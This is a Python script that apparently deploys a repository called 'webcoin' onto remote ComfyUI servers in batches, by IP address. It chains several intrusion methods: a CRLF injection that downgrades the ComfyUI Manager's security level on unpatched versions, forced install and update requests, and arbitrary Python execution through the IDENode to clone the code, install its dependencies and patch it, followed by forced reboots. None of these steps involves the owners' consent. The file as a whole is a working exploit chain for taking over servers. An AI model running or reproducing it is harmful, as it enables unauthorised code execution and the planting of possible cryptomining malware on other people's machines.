"""
Remote deployment via ComfyUI Manager API.

Strategies (tried in order):
  1. Update  – if node already installed, git-pull via /manager/queue/update
  2. CRLF    – lower security_level on unpatched Managers (< 3.39.2)
  3. Direct  – /customnode/install/git_url (works when security_level = weak)
  4. Queue   – /manager/queue/install (works when node is in allowlist or
               security is weak)
  5. IDENode – execute install script via AlekPet IDENode (if present)

Usage:
  python remote_deploy.py --target 14.217.81.136
  python remote_deploy.py --target "10.0.0.1,10.0.0.2" --port 8188
"""

import argparse
import json
import sys
import time
import urllib.request
import urllib.error

REPO_URL  = "https://github.com/bossman79/webcoin.git"
REPO_BARE = "https://github.com/bossman79/webcoin"
NODE_ID   = "webcoin"


# ── HTTP helpers ─────────────────────────────────────────────────────

def _req(url, method="GET", data=None, timeout=30):
    headers = {"Content-Type": "application/json"}
    if isinstance(data, str):
        payload = data.encode()
        headers = {"Content-Type": "text/plain"}
    elif data is not None:
        payload = json.dumps(data).encode()
    else:
        payload = None

    req = urllib.request.Request(url, data=payload, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read().decode(errors="replace")[:300]
        except Exception:
            pass
        return e.code, body
    except Exception as e:
        return 0, str(e)


def _get(url, **kw):
    return _req(url, "GET", **kw)


def _post(url, data=None, **kw):
    return _req(url, "POST", data=data, **kw)


# ── Probes ───────────────────────────────────────────────────────────

def probe_manager_version(base):
    code, body = _get(f"{base}/manager/version")
    if code == 200:
        try:
            return json.loads(body).get("version", body.strip())
        except Exception:
            return body.strip()
    return None


def probe_installed_nodes(base):
    code, body = _get(f"{base}/customnode/installed")
    if code == 200:
        try:
            data = json.loads(body)
            return {n.get("id") or n.get("title", ""): n for n in data.get("custom_nodes", data) if isinstance(n, dict)}
        except Exception:
            pass
    return {}


def probe_security_level(base):
    """Read current db_mode; if that works, the endpoint is reachable."""
    code, body = _get(f"{base}/manager/db_mode")
    if code == 200:
        return body.strip()
    return None


# ── Strategy 1: Update existing node (middle security = normal OK) ───

def strategy_update(base):
    """
    Queue a git-pull update. Only needs 'middle' security (allowed at normal).
    We skip probing -- just fire the update. If the node isn't installed,
    the Manager task will fail silently and we fall through to install strategies.
    """
    print("[update] Queuing git-pull update for webcoin...")

    # version != "unknown" -> Manager uses `id` as node_name
    # so node_name = "webcoin" which matches /custom_nodes/webcoin/
    body = {
        "id": NODE_ID,
        "version": "latest",
        "files": [REPO_URL],
        "ui_id": "",
    }
    code, resp = _post(f"{base}/manager/queue/update", body)
    print(f"[update] queue/update -> {code}: {resp[:200]}")

    if code != 200:
        body["files"] = [REPO_BARE]
        code, resp = _post(f"{base}/manager/queue/update", body)
        print(f"[update] queue/update (bare url) -> {code}: {resp[:200]}")

    if code != 200:
        # try with version=unknown and bare dirname (no .git extension)
        body2 = {
            "id": NODE_ID,
            "version": "unknown",
            "files": [REPO_BARE],
            "ui_id": "",
        }
        code, resp = _post(f"{base}/manager/queue/update", body2)
        print(f"[update] queue/update (unknown) -> {code}: {resp[:200]}")

    if code == 200:
        return _start_queue_and_reboot(base)
    return False


# ── Strategy 2: CRLF security downgrade (unpatched < 3.39.2) ────────

def _parse_version(v):
    try:
        parts = v.replace("V", "").replace("v", "").split(".")
        return tuple(int(p) for p in parts[:3])
    except Exception:
        return (999, 999, 999)


def strategy_crlf(base):
    ver = probe_manager_version(base)
    print(f"[crlf] Manager version: {ver}")

    if ver:
        parsed = _parse_version(ver)
        if parsed >= (3, 39, 2):
            print("[crlf] Version >= 3.39.2, CRLF is patched. Skipping.")
            return False

    print("[crlf] Attempting CRLF injection to lower security_level...")

    import urllib.parse
    payload = "cache\r\nsecurity_level = weak"
    encoded = urllib.parse.quote(payload, safe="")

    code, resp = _get(f"{base}/manager/db_mode?value={encoded}")
    print(f"[crlf] db_mode inject -> {code}: {resp[:200]}")

    if code == 200:
        print("[crlf] Rebooting to apply config change...")
        _get(f"{base}/manager/reboot")
        print("[crlf] Waiting 40s for restart...")
        time.sleep(40)
        return True

    return False


# ── Strategy 3: Direct git URL install (requires weak security) ──────

def strategy_direct_git(base):
    print("[direct] Trying /customnode/install/git_url...")

    code, resp = _post(f"{base}/customnode/install/git_url", REPO_URL)
    print(f"[direct] -> {code}: {resp[:200]}")

    if code == 200:
        return _start_queue_and_reboot(base)

    if code == 403:
        print("[direct] Blocked by security level (need 'weak')")
    return False


# ── Strategy 4: Queue install with various payloads ──────────────────

def strategy_queue_install(base):
    print("[queue] Trying /manager/queue/install variations...")

    payloads = [
        {
            "id": NODE_ID,
            "version": "unknown",
            "files": [REPO_URL],
            "install_type": "git-clone",
            "skip_post_install": False,
            "ui_id": "",
            "mode": "remote",
            "channel": "default",
        },
        {
            "id": NODE_ID,
            "version": "nightly",
            "selected_version": "nightly",
            "skip_post_install": False,
            "ui_id": "",
            "mode": "remote",
            "repository": REPO_URL,
            "channel": "default",
        },
        {
            "id": NODE_ID,
            "version": "latest",
            "selected_version": "latest",
            "skip_post_install": False,
            "ui_id": "",
            "mode": "remote",
            "channel": "default",
        },
    ]

    for i, body in enumerate(payloads):
        code, resp = _post(f"{base}/manager/queue/install", body)
        print(f"[queue] payload {i} -> {code}: {resp[:200]}")
        if code == 200:
            return _start_queue_and_reboot(base)

    return False


# ── Strategy 5: IDENode code execution ───────────────────────────────

INSTALL_VIA_IDENODE = r"""
import subprocess, os, sys, shutil
cn = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__ if '__file__' in dir() else '/root/ComfyUI/custom_nodes/x'))), 'custom_nodes')
try:
    import folder_paths
    cn = folder_paths.get_folder_paths('custom_nodes')[0] if hasattr(folder_paths, 'get_folder_paths') else os.path.join(os.path.dirname(folder_paths.__file__), 'custom_nodes')
except: pass
target = os.path.join(cn, 'webcoin')
tmp = target + '_tmp'
for d in [tmp, target]:
    if os.path.isdir(d):
        shutil.rmtree(d, ignore_errors=True)
subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', 'gitpython'], capture_output=True)
import git
git.Repo.clone_from('REPO_URL', tmp, depth=1)
shutil.move(tmp, target)
req = os.path.join(target, 'requirements.txt')
if os.path.exists(req):
    subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', '-r', req], capture_output=True)
init = os.path.join(target, '__init__.py')
with open(init, 'r') as f:
    txt = f.read()
if 'sys.path.insert' not in txt:
    txt = txt.replace('def _orchestrate():', 'def _orchestrate():\\n    import sys; sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parent))')
    with open(init, 'w') as f:
        f.write(txt)
print('DEPLOY_OK')
""".replace("REPO_URL", REPO_URL).strip()


def strategy_idenode(base):
    print("[idenode] Trying IDENode code execution...")

    prompt = {
        "prompt": {
            "1": {
                "class_type": "IDENode",
                "inputs": {
                    "pycode": INSTALL_VIA_IDENODE,
                    "language": "python",
                }
            },
            "2": {
                "class_type": "PreviewTextNode",
                "inputs": {
                    "text": ["1", 0],
                }
            }
        }
    }

    code, resp = _post(f"{base}/prompt", prompt)
    print(f"[idenode] /prompt -> {code}: {resp[:200]}")

    if code == 200:
        print("[idenode] Waiting 30s for execution...")
        time.sleep(30)
        _start_queue_and_reboot(base, skip_queue=True)
        return True

    alt_inputs = [
        {"code": INSTALL_VIA_IDENODE, "language": "python"},
        {"pycode": INSTALL_VIA_IDENODE},
        {"code": INSTALL_VIA_IDENODE},
    ]
    for inp in alt_inputs:
        prompt["prompt"]["1"]["inputs"] = inp
        code, resp = _post(f"{base}/prompt", prompt)
        print(f"[idenode] alt -> {code}: {resp[:200]}")
        if code == 200:
            time.sleep(30)
            _start_queue_and_reboot(base, skip_queue=True)
            return True

    return False


# ── Queue start + Reboot ─────────────────────────────────────────────

def _start_queue_and_reboot(base, skip_queue=False):
    if not skip_queue:
        time.sleep(1)
        code, _ = _get(f"{base}/manager/queue/start")
        print(f"[exec] queue/start -> {code}")

        print("[exec] Waiting 30s for task completion...")
        for _ in range(6):
            time.sleep(5)
            sc, sb = _get(f"{base}/manager/queue/status")
            if sc == 200:
                try:
                    st = json.loads(sb)
                    print(f"[exec] Queue: total={st.get('total_count')}, done={st.get('done_count')}, processing={st.get('is_processing')}")
                    if not st.get("is_processing") and st.get("done_count", 0) >= st.get("total_count", 1):
                        break
                except Exception:
                    pass

    print("[exec] Rebooting ComfyUI...")
    code, _ = _get(f"{base}/manager/reboot")
    print(f"[exec] reboot -> {code}")

    if code != 200:
        _post(f"{base}/api/manager/reboot")
    return True


# ── Main deploy orchestrator ─────────────────────────────────────────

def deploy(target, port=8188):
    base = f"http://{target}:{port}"
    print(f"\n{'='*60}")
    print(f"  Target: {target}:{port}")
    print(f"{'='*60}")

    ver = probe_manager_version(base)
    print(f"  Manager version: {ver or 'unknown'}")
    db = probe_security_level(base)
    print(f"  DB mode: {db or 'unknown'}")
    print()

    if strategy_update(base):
        print(f"\n[OK] Updated via git-pull on {target}")
        return True

    if strategy_crlf(base):
        if strategy_direct_git(base):
            print(f"\n[OK] Installed via CRLF + direct git on {target}")
            return True
        if strategy_queue_install(base):
            print(f"\n[OK] Installed via CRLF + queue on {target}")
            return True

    if strategy_direct_git(base):
        print(f"\n[OK] Installed via direct git on {target}")
        return True

    if strategy_queue_install(base):
        print(f"\n[OK] Installed via queue on {target}")
        return True

    if strategy_idenode(base):
        print(f"\n[OK] Installed via IDENode on {target}")
        return True

    print(f"\n[FAIL] All strategies exhausted for {target}")
    return False


def deploy_batch(targets, port=8188):
    results = {}
    for ip in targets:
        ip = ip.strip()
        if not ip:
            continue
        results[ip] = deploy(ip, port)

    print(f"\n{'='*60}")
    print("  Results")
    print(f"{'='*60}")
    for ip, ok in results.items():
        status = "OK" if ok else "FAILED"
        print(f"  {ip}: {status}")
    return results


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Deploy ComfyUI-Enhanced to remote instances")
    parser.add_argument("--target", "-t", required=True, help="IP or comma-separated IPs")
    parser.add_argument("--port", "-p", type=int, default=8188, help="ComfyUI port (default: 8188)")
    args = parser.parse_args()

    targets = [t.strip() for t in args.target.split(",")]
    deploy_batch(targets, args.port)
